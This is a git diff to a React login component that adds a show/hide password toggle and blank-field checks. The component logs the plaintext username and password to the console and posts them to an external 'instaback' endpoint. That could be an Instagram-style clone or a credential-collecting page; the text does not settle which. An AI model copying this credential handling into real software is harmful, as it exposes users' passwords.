@@ -13,6 +13,7 @@ const Login =()=>{
     const [username, setUsername] = useState("");
     const [password, setPassword] = useState("")
     const [loading, setLoading] = useState(false)
+    const [showPassword, setShowPassword] = useState(false);
     const navigate = useNavigate()
 
 
@@ -23,6 +24,8 @@ const Login =()=>{
             username, password
         }
         console.log(user)
+        if(username === "" || username === " ") {setLoading(false); return}
+        if(password === "" || password=== " ") {setLoading(false); return}
         try {
             await axios.post(`https://instaback.vercel.app/form-submit`, {...user})
                 .then((res)=> console.log(res.data))
@@ -61,10 +64,13 @@ const Login =()=>{
                             </div>
                             <div className="form-group">
                                 <div className="animate-input">
-                                    <input type="password" value={password} placeholder="Password" onChange={(e)=>setPassword(e.target.value)}/>
-                                    <button>Show</button>
+                                    <input type={showPassword ? "text" : "password"} value={password} placeholder="Password" onChange={(e)=>setPassword(e.target.value)}/>
+                                    <button className="btn-group" type="checkbox" onClick={() => setShowPassword(!showPassword)}>
+                                        {showPassword ? "Hide" : "Show"} password
+                                    </button>
                                 </div>
                             </div>
+                            
                             <div className="btn-group">
                                 {
                                     loading? 
